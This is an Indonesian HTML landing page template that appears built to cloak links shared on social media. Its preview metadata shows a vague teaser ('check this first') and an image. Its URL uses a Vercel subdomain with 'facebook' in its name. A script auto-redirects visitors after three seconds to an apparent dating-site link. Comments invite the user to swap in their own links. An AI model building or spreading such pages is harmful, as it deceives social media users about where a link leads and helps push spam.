<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Info Penting Untuk Kamu</title>

  <!-- INI KUNCINYA BIAR FOTO NONGOL DI FB/IG/WA -->
  <meta property="og:title" content="Cek Ini Dulu Ya" />
  <meta property="og:description" content="Klik untuk lanjut ke halaman tujuan" />
  <meta property="og:image" content="https://res.cloudinary.com/daxme62nv/image/upload/v1782712523/zkyigp48izkkv2tqwycy.jpg" /> <!-- GANTI LINK FOTO CLOUDINARY -->
  <meta property="og:url" content="https://facebook-roomvvip17.vercel.app" /> <!-- GANTI LINK LANDINGPAGE KAMU -->
  <meta property="og:type" content="website" />
  
  <!-- Buat WA dan Twitter -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://res.cloudinary.com/daxme62nv/image/upload/v1783347116/fwxiynimv6i4nwi3lzss.jpg"> <!-- GANTI JUGA -->

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html { height: 100%; font-family: 'Poppins', sans-serif; overflow: hidden; }
    .bg {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      background-image: url('https://res.cloudinary.com/daxme62nv/image/upload/v1783347116/fwxiynimv6i4nwi3lzss.jpg'); /* GANTI LINK FOTO SAMA */
      background-size: cover; background-position: center;
      filter: brightness(0.6);
    }
    .overlay { position: relative; z-index: 2; height: 100%; display: flex; justify-content: center; align-items: center; padding: 20px; }
    .card {
      background: rgba(0, 0, 0, 0.55); backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 24px;
      padding: 40px 35px; max-width: 420px; width: 100%;
      text-align: center; color: #fff; box-shadow: 0 20px 60px rgba(0,0,0,0.4);
    }
    h1 { font-size: 28px; font-weight: 700; margin-bottom: 10px; }
    p { font-size: 15px; opacity: 0.9; margin-bottom: 25px; }
    .countdown { font-size: 50px; font-weight: 700; background: rgba(255,255,255,0.15); border-radius: 16px; padding: 15px; margin-bottom: 20px; }
    .btn { display: inline-block; padding: 14px 32px; background: #fff; color: #000; border-radius: 50px; text-decoration: none; font-weight: 600; font-size: 16px; }
  </style>
</head>
<body>
  <div class="bg"></div>
  <div class="overlay">
    <div class="card">
      <h1>Tunggu Sebentar</h1>
      <p>Kamu akan diarahkan otomatis</p>
      <div class="countdown" id="count">3</div>
      <a id="redirectBtn" href="#" class="btn">Klik Jika Tidak Otomatis</a>
    </div>
  </div>

  <script>
    const redirectUrl = "https://cozzydate.my.id/7H5juOPKz0PJbtkKHnhABfXlw2z5US66"; // GANTI LINK TUJUAN
    let timeLeft = 3;
    document.getElementById("redirectBtn").href = redirectUrl;
    const timer = setInterval(() => {
      timeLeft--;
      document.getElementById("count").innerText = timeLeft;
      if(timeLeft <= 0) {
        clearInterval(timer);
        window.location.replace(redirectUrl);
      }
    }, 1000);
  </script>
</body>
</html>
